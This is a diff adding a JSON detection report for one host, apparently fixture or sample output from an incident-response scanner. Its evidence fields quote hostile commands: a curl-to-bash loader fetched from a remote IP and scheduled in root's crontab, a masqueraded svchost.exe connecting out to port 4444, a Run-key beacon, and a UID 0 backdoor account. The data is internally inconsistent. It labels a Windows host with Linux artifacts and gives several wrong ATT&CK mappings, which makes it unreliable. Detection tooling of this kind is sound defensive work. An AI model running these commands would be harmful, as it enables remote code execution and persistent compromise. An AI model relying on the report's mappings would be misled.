@@ -1,0 +1,143 @@
+{
+  "host": "HOST-001",
+  "os": "Windows",
+  "scan_id": "JCK-2026-225",
+  "timestamp": "2026-09-17T08:00:00Z",
+  "evidence_count": 1313,
+  "processes_count": 5,
+  "services_count": 6,
+  "users_count": 5,
+  "sockets_count": 7,
+  "persistence_count": 6,
+  "files_count": 24821,
+  "logs_count": 18432,
+  "indicators": [
+    {
+      "id": "IND-PROC-31337",
+      "title": "Suspicious Binary Execution From Temporary Directory (svchost.exe)",
+      "severity": "CRITICAL",
+      "category": "PROCESS",
+      "description": "Process PID 31337 'svchost.exe' launched from non-standard writable path.",
+      "evidence": "PID: 31337, Cmdline: C:\\Users\\Public\\svchost.exe --connect 185.220.101.5:4444",
+      "mitre_attck_id": "T1059.004"
+    },
+    {
+      "id": "IND-MASQ-31337",
+      "title": "Process Masquerading as Core System Component (svchost.exe)",
+      "severity": "HIGH",
+      "category": "PROCESS",
+      "description": "Rogue process name mimics kernel or Windows service daemon to evade analyst inspection.",
+      "evidence": "PID: 31337, Name: svchost.exe, Cmdline: C:\\Users\\Public\\svchost.exe --connect 185.220.101.5:4444",
+      "mitre_attck_id": "T1036.005"
+    },
+    {
+      "id": "IND-SHELL-4120",
+      "title": "Remote Shell Dropper Pipeline Detected",
+      "severity": "CRITICAL",
+      "category": "PROCESS",
+      "description": "Live piped execution of remote unverified script via curl/bash.",
+      "evidence": "PID: 4120, Cmdline: curl -s http://194.26.29.112/loader.sh | bash",
+      "mitre_attck_id": "T1059.004"
+    },
+    {
+      "id": "IND-SVC-backdoor_svc_service",
+      "title": "Unauthorized Service Binary Path in Service 'backdoor_svc.service'",
+      "severity": "CRITICAL",
+      "category": "SERVICE",
+      "description": "Service configured to execute binary from volatile temporary directory.",
+      "evidence": "Service: backdoor_svc.service, ExecStart: /tmp/.hidden_kworker -d",
+      "mitre_attck_id": "T1543.002"
+    },
+    {
+      "id": "IND-USER-guest_backdoor",
+      "title": "Non-Root Account Granted Root UID 0 ('guest_backdoor')",
+      "severity": "CRITICAL",
+      "category": "USER",
+      "description": "Account has superuser privileges (UID 0) while possessing a non-root username (backdoor user creation).",
+      "evidence": "User: guest_backdoor, UID: 0, Home: /tmp/.root, Shell: /bin/sh",
+      "mitre_attck_id": "T1136.001"
+    },
+    {
+      "id": "IND-PERS-WindowsUpdateUpdater",
+      "title": "Suspicious Scheduled Persistence Hook (WindowsUpdateUpdater)",
+      "severity": "HIGH",
+      "category": "PERSISTENCE",
+      "description": "Persistence mechanism in REGISTRY_RUN_KEY executes anomalous network updater or script.",
+      "evidence": "Name: WindowsUpdateUpdater, Path: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run, Command: C:\\Users\\Public\\updater.exe --silent --connect 185.220.101.5:443",
+      "mitre_attck_id": "T1053.003"
+    },
+    {
+      "id": "IND-PERS-hourly_sync_malicious",
+      "title": "Suspicious Scheduled Persistence Hook (hourly_sync_malicious)",
+      "severity": "HIGH",
+      "category": "PERSISTENCE",
+      "description": "Persistence mechanism in CRON_JOB executes anomalous network updater or script.",
+      "evidence": "Name: hourly_sync_malicious, Path: /var/spool/cron/crontabs/root, Command: curl -s http://194.26.29.112/loader.sh | bash",
+      "mitre_attck_id": "T1053.003"
+    },
+    {
+      "id": "IND-NET-C2-4444",
+      "title": "Active Outbound C2 Network Socket to 185.220.101.5:4444",
+      "severity": "CRITICAL",
+      "category": "NETWORK",
+      "description": "Host maintains active socket connection to known malicious C2 IP address.",
+      "evidence": "Local: 10.0.5.42:52314, Remote: 185.220.101.5:4444, Process: .hidden_kworker",
+      "mitre_attck_id": "T1071.001"
+    },
+    {
+      "id": "IND-NET-LISTEN-31337",
+      "title": "Backdoor Listening Port Detected (Port 31337)",
+      "severity": "HIGH",
+      "category": "NETWORK",
+      "description": "Unauthorized service listening on well-known exploitation port.",
+      "evidence": "Port: 31337, Protocol: TCP, PID: Some(31337)",
+      "mitre_attck_id": "T1571"
+    },
+    {
+      "id": "IND-NET-C2-8080",
+      "title": "Active Outbound C2 Network Socket to 194.26.29.112:8080",
+      "severity": "CRITICAL",
+      "category": "NETWORK",
+      "description": "Host maintains active socket connection to known malicious C2 IP address.",
+      "evidence": "Local: 10.0.5.42:48920, Remote: 194.26.29.112:8080, Process: curl",
+      "mitre_attck_id": "T1071.001"
+    },
+    {
+      "id": "IND-CFG-001",
+      "title": "SSH Password Authentication Allowed",
+      "severity": "MEDIUM",
+      "category": "CONFIGURATION",
+      "description": "sshd_config allows password-based authentication; public key auth recommended.",
+      "evidence": "/etc/ssh/sshd_config: PasswordAuthentication yes",
+      "mitre_attck_id": "T1110"
+    },
+    {
+      "id": "IND-CFG-002",
+      "title": "Audit Logging Daemon Buffer Threshold Warning",
+      "severity": "LOW",
+      "category": "LOGS",
+      "description": "System audit queue buffer capacity at 78% of max limit.",
+      "evidence": "auditctl -s: backlog_limit 8192, current 6410",
+      "mitre_attck_id": "T1562.002"
+    },
+    {
+      "id": "IND-TIME-003",
+      "title": "Local System Clock Skew Within Acceptable Drift",
+      "severity": "LOW",
+      "category": "SYSTEM",
+      "description": "NTP synchronization drift measured at +0.014s.",
+      "evidence": "chronyc tracking: offset 0.014012 seconds",
+      "mitre_attck_id": "T1070"
+    }
+  ],
+  "indicator_summary": {
+    "total": 13,
+    "critical": 6,
+    "high": 4,
+    "medium": 1,
+    "low": 2
+  },
+  "evidence_sha256": "74f8dd5cf4b5f5a119e2fae08256df7896629909f1f40d065025202c45271d5c",
+  "json_report_path": "../reports\\HOST-001-2026-09-17.json",
+  "html_report_path": "../reports\\HOST-001-2026-09-17.html"
+}
